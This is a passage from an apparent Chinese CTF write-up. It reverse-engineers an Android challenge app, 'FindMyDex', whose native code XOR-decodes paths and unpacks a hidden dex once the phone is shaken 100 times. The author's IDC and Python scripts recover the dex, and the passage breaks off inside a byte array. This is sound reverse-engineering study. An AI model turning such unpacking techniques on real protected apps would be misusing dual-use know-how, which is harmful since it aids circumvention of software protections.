class="keyword">int</span> result; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [sp+8h] [bp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// [sp+Ah] [bp-12h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [sp+Ch] [bp-10h]</span></span><br><span class="line"></span><br><span class="line">  v1 = a1;</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">16</span>) = AConfiguration_new();</span><br><span class="line">  v2 = *(_DWORD *)(*(_DWORD *)(v1 + <span class="number">12</span>) + <span class="number">32</span>);</span><br><span class="line">  AConfiguration_fromAssetManager();</span><br><span class="line">  AConfiguration_getLanguage(*(_DWORD *)(v1 + <span class="number">16</span>), &amp;v6);</span><br><span class="line">  AConfiguration_getCountry(*(_DWORD *)(v1 + <span class="number">16</span>), &amp;v5);</span><br><span class="line">  *(_DWORD *)(v1 + <span class="number">84</span>) = <span class="number">1</span>;</span><br><span class="line">  *(_DWORD *)(v1 + <span class="number">88</span>) = v1;</span><br><span class="line">  *(_DWORD *)(v1 + <span class="number">92</span>) = sub_3344;</span><br><span class="line">  *(_DWORD *)(v1 + <span class="number">96</span>) = <span class="number">2</span>;</span><br><span class="line">  *(_DWORD *)(v1 + <span class="number">100</span>) = v1;</span><br><span class="line">  *(_DWORD *)(v1 + <span class="number">104</span>) = sub_3370;</span><br><span class="line">  v3 = ALooper_prepare(<span class="number">1</span>);</span><br><span class="line">  ALooper_addFd(v3, *(_DWORD *)(v1 + <span class="number">72</span>), <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, v1 + <span class="number">84</span>);</span><br><span class="line">  *(_DWORD *)(v1 + <span class="number">28</span>) = v3;</span><br><span class="line">  pthread_mutex_lock((<span class="keyword">pthread_mutex_t</span> *)(v1 + <span class="number">64</span>));</span><br><span class="line">  *(_DWORD *)(v1 + <span class="number">108</span>) = <span class="number">1</span>;</span><br><span class="line">  pthread_cond_broadcast((<span class="keyword">pthread_cond_t</span> *)(v1 + <span class="number">68</span>));</span><br><span class="line">  pthread_mutex_unlock((<span class="keyword">pthread_mutex_t</span> *)(v1 + <span class="number">64</span>));</span><br><span class="line">  j_android_main(v1);</span><br><span class="line">  android_app_destroy(v1);</span><br><span class="line">  pthread_mutex_lock((<span class="keyword">pthread_mutex_t</span> *)(v1 + <span class="number">64</span>));</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)(v1 + <span class="number">32</span>) )</span><br><span class="line">    AInputQueue_detachLooper();</span><br><span class="line">  AConfiguration_delete(*(_DWORD *)(v1 + <span class="number">16</span>));</span><br><span class="line">  *(_DWORD *)(v1 + <span class="number">116</span>) = <span class="number">1</span>;</span><br><span class="line">  pthread_cond_broadcast((<span class="keyword">pthread_cond_t</span> *)(v1 + <span class="number">68</span>));</span><br><span class="line">  pthread_mutex_unlock((<span class="keyword">pthread_mutex_t</span> *)(v1 + <span class="number">64</span>));</span><br><span class="line">  result = _stack_chk_guard - v7;</span><br><span class="line">  <span class="keyword">if</span> ( _stack_chk_guard == v7 )</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入 MainActivity 之后，一开始有一段异或的数据：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">*(_DWORD *)filename = <span class="number">0x9D888DC6</span>;</span><br><span class="line">*(_DWORD *)&amp;filename[<span class="number">4</span>] = <span class="number">0x888DC688</span>;</span><br><span class="line">*(_DWORD *)&amp;filename[<span class="number">8</span>] = <span class="number">0x8AC6889D</span>;</span><br><span class="line">*(_DWORD *)&amp;filename[<span class="number">12</span>] = <span class="number">0x88C78486</span>;</span><br><span class="line">*(_DWORD *)&amp;filename[<span class="number">16</span>] = <span class="number">0x84889AC7</span>;</span><br><span class="line">*(_DWORD *)&amp;filename[<span class="number">20</span>] = <span class="number">0xC78C8599</span>;</span><br><span class="line">*(_DWORD *)&amp;filename[<span class="number">24</span>] = <span class="number">0x8D87808F</span>;</span><br><span class="line">*(_DWORD *)&amp;filename[<span class="number">28</span>] = <span class="number">0x8C8D9084</span>;</span><br><span class="line">*(_DWORD *)&amp;filename[<span class="number">32</span>] = <span class="number">0x808FC691</span>;</span><br><span class="line">*(_DWORD *)&amp;filename[<span class="number">36</span>] = <span class="number">0xC69A8C85</span>;</span><br><span class="line">*(_DWORD *)&amp;filename[<span class="number">40</span>] = <span class="number">0x9A88858A</span>;</span><br><span class="line">*(_DWORD *)&amp;filename[<span class="number">44</span>] = <span class="number">0xC79A8C9A</span>;</span><br><span class="line">*(_DWORD *)&amp;filename[<span class="number">48</span>] = <span class="number">0xE9918C8D</span>;</span><br><span class="line">filename[<span class="number">52</span>] = <span class="number">0</span>;</span><br><span class="line">*(_DWORD *)name = <span class="number">0x9D888DC6</span>;</span><br><span class="line">*(_DWORD *)&amp;name[<span class="number">4</span>] = <span class="number">0x888DC688</span>;</span><br><span class="line">*(_DWORD *)&amp;name[<span class="number">8</span>] = <span class="number">0x8AC6889D</span>;</span><br><span class="line">*(_DWORD *)&amp;name[<span class="number">12</span>] = <span class="number">0x88C78486</span>;</span><br><span class="line">*(_DWORD *)&amp;name[<span class="number">16</span>] = <span class="number">0x84889AC7</span>;</span><br><span class="line">*(_DWORD *)&amp;name[<span class="number">20</span>] = <span class="number">0xC78C8599</span>;</span><br><span class="line">*(_DWORD *)&amp;name[<span class="number">24</span>] = <span class="number">0x8D87808F</span>;</span><br><span class="line">*(_DWORD *)&amp;name[<span class="number">28</span>] = <span class="number">0x8C8D9084</span>;</span><br><span class="line">*(_DWORD *)&amp;name[<span class="number">32</span>] = <span class="number">0x808FC691</span>;</span><br><span class="line">*(_DWORD *)&amp;name[<span class="number">36</span>] = <span class="number">0xC69A8C85</span>;</span><br><span class="line">*(_DWORD *)&amp;name[<span class="number">40</span>] = <span class="number">0x918C8D86</span>;</span><br><span class="line">name[<span class="number">46</span>] = <span class="number">0</span>;</span><br><span class="line">i = <span class="number">1</span>;</span><br><span class="line">*(_WORD *)&amp;name[<span class="number">44</span>] = <span class="number">0xE9C6</span>u;</span><br><span class="line">filename[<span class="number">0</span>] = <span class="number">47</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  filename[i] ^= <span class="number">0xE9</span>u;                       <span class="comment">// filename = '/data/data/com.a.sample.findmydex/files/classes.dex'</span></span><br><span class="line">  ++i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( i != <span class="number">53</span> );</span><br><span class="line">j = <span class="number">1</span>;</span><br><span class="line">name[<span class="number">0</span>] = <span class="number">47</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  name[j] ^= <span class="number">0xE9</span>u;                           <span class="comment">// name = '/data/data/com.a.sample.findmydex/files/odex/'</span></span><br><span class="line">  ++j;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( j != <span class="number">47</span> );</span><br></pre></td></tr></table></figure><p>解密一下，可以发现是生成目标 dex 文件和 odex 的路径：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">word2bytes</span><span class="params">(w)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> [w &amp; <span class="number">0xFF</span>, (w &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>, (w &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>, w &gt;&gt; <span class="number">24</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bytes2word</span><span class="params">(bs)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> bs[<span class="number">0</span>] | bs[<span class="number">1</span>] &lt;&lt; <span class="number">8</span> | bs[<span class="number">2</span>] &lt;&lt; <span class="number">16</span> | bs[<span class="number">3</span>] &lt;&lt; <span class="number">24</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">words2byte</span><span class="params">(ws)</span>:</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> w <span class="keyword">in</span> ws:</span><br><span class="line">        temp = word2bytes(w)</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> temp:</span><br><span class="line">            result.append(b)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bytes2words</span><span class="params">(bs)</span>:</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(bs) / <span class="number">4</span>):</span><br><span class="line">        temp = bytes2word(bs[<span class="number">4</span>*i:<span class="number">4</span>*i+<span class="number">4</span>])</span><br><span class="line">        result.append(temp)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">filename = [<span class="number">0x9D888DC6</span>, <span class="number">0x888DC688</span>, <span class="number">0x8AC6889D</span>, <span class="number">0x88C78486</span>, <span class="number">0x84889AC7</span>, <span class="number">0xC78C8599</span>, <span class="number">0x8D87808F</span>, <span class="number">0x8C8D9084</span>, <span class="number">0x808FC691</span>, <span class="number">0xC69A8C85</span>, <span class="number">0x9A88858A</span>, <span class="number">0xC79A8C9A</span>, <span class="number">0xE9918C8D</span>]</span><br><span class="line">name = [<span class="number">0x9D888DC6</span>, <span class="number">0x888DC688</span>, <span class="number">0x8AC6889D</span>, <span class="number">0x88C78486</span>, <span class="number">0x84889AC7</span>, <span class="number">0xC78C8599</span>, <span class="number">0x8D87808F</span>, <span class="number">0x8C8D9084</span>, <span class="number">0x808FC691</span>, <span class="number">0xC69A8C85</span>, <span class="number">0x918C8D86</span>, <span class="number">0x0000E9C6</span>]</span><br><span class="line">filename = words2byte(filename)</span><br><span class="line">name = words2byte(name)</span><br><span class="line">filename = chr(<span class="number">47</span>) + <span class="string">''</span>.join(list(map(<span class="keyword">lambda</span> c: chr(c ^ <span class="number">0xE9</span>), filename[<span class="number">1</span>:])))</span><br><span class="line">name = chr(<span class="number">47</span>) + <span class="string">''</span>.join(list(map(<span class="keyword">lambda</span> c: chr(c ^ <span class="number">0xE9</span>), name[<span class="number">1</span>:])))</span><br><span class="line"><span class="keyword">print</span> filename</span><br><span class="line"><span class="comment"># /data/data/com.a.sample.findmydex/files/classes.dex</span></span><br><span class="line"><span class="keyword">print</span> name</span><br><span class="line"><span class="comment"># /data/data/com.a.sample.findmydex/files/odex/</span></span><br></pre></td></tr></table></figure><p>然后接下来，可以看到一些涉及到 OpenGL 库的函数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">  _android_log_print(<span class="number">4</span>, <span class="string">"FindMyDex"</span>, <span class="string">"Can you shake your phone 100 times in 10 seconds?"</span>);</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v12 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !v30 )</span><br><span class="line">        v12 = <span class="number">-1</span>;</span><br><span class="line">      v13 = ALooper_pollAll(v12, <span class="number">0</span>, &amp;v25, &amp;v24);<span class="comment">// get time</span></span><br><span class="line">      <span class="keyword">if</span> ( v13 &gt;= <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v30 )</span><br><span class="line">      &#123;</span><br><span class="line">        v11 = v31 + <span class="number">0.01</span>;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">float</span>)(v31 + <span class="number">0.01</span>) &gt; <span class="number">1.0</span> )</span><br><span class="line">          v11 = <span class="number">0.0</span>;</span><br><span class="line">        v31 = v11;</span><br><span class="line">        sub_2C14((<span class="keyword">int</span>)&amp;v26);                    <span class="comment">// OpenGL</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">sub_2C14</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// r4</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  v1 = a1;</span><br><span class="line">  result = *(_DWORD *)(a1 + <span class="number">20</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  glClearColor(</span><br><span class="line">    (<span class="keyword">float</span>)*(<span class="keyword">signed</span> <span class="keyword">int</span> *)(v1 + <span class="number">44</span>) / (<span class="keyword">float</span>)*(<span class="keyword">signed</span> <span class="keyword">int</span> *)(v1 + <span class="number">32</span>),<span class="comment">// red</span></span><br><span class="line">    *(GLclampf *)(v1 + <span class="number">40</span>),                     <span class="comment">// green</span></span><br><span class="line">    (<span class="keyword">float</span>)*(<span class="keyword">signed</span> <span class="keyword">int</span> *)(v1 + <span class="number">48</span>) / (<span class="keyword">float</span>)*(<span class="keyword">signed</span> <span class="keyword">int</span> *)(v1 + <span class="number">36</span>),<span class="comment">// blue</span></span><br><span class="line">    <span class="number">1.0</span>);</span><br><span class="line">  glClear(<span class="number">0x4000</span>u);</span><br><span class="line">  result = j_eglSwapBuffers(*(_QWORD *)(v1 + <span class="number">20</span>), *(_QWORD *)(v1 + <span class="number">20</span>) &gt;&gt; <span class="number">32</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这部分不去仔细看，可以直接根据 log 来判断程序的流程，可以判断出是要求在 10 秒内摇 100 次手机。在 <code>(times - 1) &lt;= 88</code> 处可以看到开始对数据进行解压缩处理。在后面 <code>times == 100</code>，可以判断是达到了 100 次后，开始对将数据输出到文件中：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">  _android_log_print(<span class="number">4</span>, <span class="string">"FindMyDex"</span>, <span class="string">"Can you shake your phone 100 times in 10 seconds?"</span>);</span><br><span class="line">...</span><br><span class="line">            _android_log_print(<span class="number">4</span>, <span class="string">"FindMyDex"</span>, <span class="string">"Oh yeah~ You Got it~ %d times to go~"</span>, <span class="number">99</span> - v10);</span><br><span class="line">...</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(times - <span class="number">1</span>) &lt;= <span class="number">88</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v10 = times;</span><br><span class="line">          v15 = times / <span class="number">10</span>;</span><br><span class="line">          <span class="keyword">if</span> ( times % <span class="number">10</span> == <span class="number">9</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v16 = size_1;</span><br><span class="line">            v17 = (<span class="keyword">signed</span> <span class="keyword">int</span>)size_1 / <span class="number">10</span>;</span><br><span class="line">            v18 = (v15 + <span class="number">1</span>) * ((<span class="keyword">signed</span> <span class="keyword">int</span>)size_1 / <span class="number">10</span>);</span><br><span class="line">            <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)size_1 / <span class="number">10</span> * v15 &lt; v18 )</span><br><span class="line">            &#123;</span><br><span class="line">              v19 = &amp;data[v17 * v15];</span><br><span class="line">              <span class="keyword">do</span></span><br><span class="line">              &#123;</span><br><span class="line">                --v17;</span><br><span class="line">                *v19++ ^= times;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">while</span> ( v17 );</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( times == <span class="number">89</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">while</span> ( v18 &lt; (<span class="keyword">signed</span> <span class="keyword">int</span>)v16 )</span><br><span class="line">                data[v18++] ^= <span class="number">0x59</span>u;</span><br><span class="line">            &#125;</span><br><span class="line">            v10 = times + <span class="number">1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( times == <span class="number">100</span> )                     <span class="comment">// reach the target</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)(time(<span class="number">0</span>) - v6) &gt; <span class="number">9</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            _android_log_print(<span class="number">4</span>, <span class="string">"FindMyDex"</span>, <span class="string">"OH~ You are too slow. Please try again"</span>);</span><br><span class="line">            _aeabi_memcpy(data, &amp;data_1, size_1);</span><br><span class="line">            v10 = <span class="number">0</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v20 = v6;</span><br><span class="line">            <span class="keyword">if</span> ( uncompress(dest, &amp;destLen, data, (uLong)size_1) )<span class="comment">// uncompress data</span></span><br><span class="line">              _android_log_print(<span class="number">5</span>, <span class="string">"FindMyDex"</span>, <span class="string">"Dangerous operation detected."</span>);</span><br><span class="line">            v21 = open(filename, <span class="number">577</span>, <span class="number">511</span>);</span><br><span class="line">            <span class="keyword">if</span> ( !v21 )</span><br><span class="line">              _android_log_print(<span class="number">5</span>, <span class="string">"FindMyDex"</span>, <span class="string">"Something wrong with the permission."</span>);</span><br><span class="line">            write(v21, dest, destLen);</span><br><span class="line">            close(v21);</span><br><span class="line">            <span class="built_in">free</span>(dest);</span><br><span class="line">            <span class="built_in">free</span>(data);</span><br><span class="line">            <span class="keyword">if</span> ( access(name, <span class="number">0</span>) &amp;&amp; mkdir(name, <span class="number">0x1FF</span>u) )</span><br><span class="line">              _android_log_print(<span class="number">5</span>, <span class="string">"FindMyDex"</span>, <span class="string">"Something wrong with the permission.."</span>);</span><br><span class="line">            sub_2368((<span class="keyword">int</span>)v1);</span><br><span class="line">            remove(filename);</span><br><span class="line">            _android_log_print(<span class="number">4</span>, <span class="string">"FindMyDex"</span>, <span class="string">"Congratulations!! You made it!"</span>);</span><br><span class="line">            sub_2250(v1);</span><br><span class="line">            v10 = <span class="number">0x80000000</span>;</span><br><span class="line">            v6 = v20;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>用 IDC 脚本把数据 dump 下来：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> fp, start, end, len, b;</span><br><span class="line">    fp = fopen(<span class="string">"dump.data"</span>, <span class="string">"wb"</span>);</span><br><span class="line">    start = <span class="number">0x7004</span>;</span><br><span class="line">    len = <span class="number">0x3CA10</span>;</span><br><span class="line">    end = start + len;</span><br><span class="line">    <span class="keyword">for</span> (b = start; b &lt; end; b++) &#123;</span><br><span class="line">        fputc(Byte(b), fp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后实现一下对 dex 文件的解压缩过程：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'dump.data'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line">data = [ord(c) <span class="keyword">for</span> c <span class="keyword">in</span> data]</span><br><span class="line">size = <span class="number">0x3CA10</span></span><br><span class="line"><span class="keyword">for</span> times <span class="keyword">in</span> range(<span class="number">90</span>):</span><br><span class="line">    v15 = times / <span class="number">10</span></span><br><span class="line">    <span class="keyword">if</span> times % <span class="number">10</span> == <span class="number">9</span>:</span><br><span class="line">        v16 = size</span><br><span class="line">        v17 = size / <span class="number">10</span></span><br><span class="line">        v18 = (v15 + <span class="number">1</span>) * (size / <span class="number">10</span>)</span><br><span class="line">        <span class="keyword">if</span> size / <span class="number">10</span> * v15 &lt; v18:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(v17):</span><br><span class="line">                data[v17 * v15 + i] ^= times</span><br><span class="line">        <span class="keyword">if</span> times == <span class="number">89</span>:</span><br><span class="line">            <span class="keyword">while</span> v18 - v16 &lt; <span class="number">0</span>:</span><br><span class="line">                data[v18] ^= <span class="number">0x59</span></span><br><span class="line">                v18 += <span class="number">1</span></span><br><span class="line">data = <span class="string">''</span>.join([chr(c) <span class="keyword">for</span> c <span class="keyword">in</span> data])</span><br><span class="line">data = zlib.decompress(data)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'dump.dex'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> data:</span><br><span class="line">        f.write(c)</span><br></pre></td></tr></table></figure><p>接下来用 JEB 对 dex 文件进行分析。首先在 MainActivity 中，变量 m 是密文，onCreate 中调用了 a 类。函数 b 则是一个加密函数，其中涉及到了 b 类中函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.a.sample.findmydex;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.a.u;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.nio.ByteBuffer;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">u</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] m;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        MainActivity.m = <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;-<span class="number">120</span>, <span class="number">77</span>, -<span class="number">14</span>, -<span class="number">38</span>, <span class="number">17</span>, <span class="number">5</span>, -<span class="number">42</span>, <span class="number">44</span>, -<span class="number">32</span>, <span class="number">109</span>, <span class="number">85</span>, <span class="number">0x1F</span>, <span class="number">24</span>, -<span class="number">91</span>, -<span class="number">112</span>, -<span class="number">83</span>, <span class="number">0x40</span>, -<span class="number">83</span>, -<span class="number">128</span>, <span class="number">84</span>, <span class="number">5</span>, -<span class="number">94</span>, -<span class="number">98</span>, -<span class="number">30</span>, <span class="number">18</span>, <span class="number">70</span>, -<span class="number">26</span>, <span class="number">71</span>, <span class="number">5</span>, -<span class="number">99</span>, -<span class="number">62</span>, -<span class="number">58</span>, <span class="number">0x75</span>, <span class="number">29</span>, -<span class="number">44</span>, <span class="number">6</span>, <span class="number">0x70</span>, -<span class="number">4</span>, <span class="number">81</span>, <span class="number">84</span>, <span 